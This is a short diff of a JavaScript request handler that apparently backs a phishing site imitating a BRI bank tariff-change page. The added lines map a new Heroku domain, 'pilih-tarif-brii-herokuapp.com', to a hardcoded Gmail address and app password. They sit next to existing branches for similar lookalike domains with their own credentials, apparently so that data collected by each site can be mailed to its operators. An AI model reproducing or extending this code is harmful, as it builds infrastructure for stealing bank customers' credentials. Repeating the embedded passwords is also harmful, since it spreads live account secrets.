@@ -6,18 +6,17 @@ export default function handler(req, res) {
 
     let email = '';
     let pass = '';
-    
-    
+     
+    if (url == 'pilih-tarif-brii-herokuapp.com'){
 
+       email = 'basengla460@gmail.com'
+       pass = 'wjvaeltorqzfqdcm'
+    }else
     if (url == 'pilihan-tarif-bri-new.herokuapp.com'){
 
        email = 'landaslepas77@gmail.com'
        pass = 'eyosohykexzgicup'
     }else
-
-
-    
-        
     if(url == 'perubahantarifbri.herokuapp.com') //jika url sama dengan url hosting
     {
 
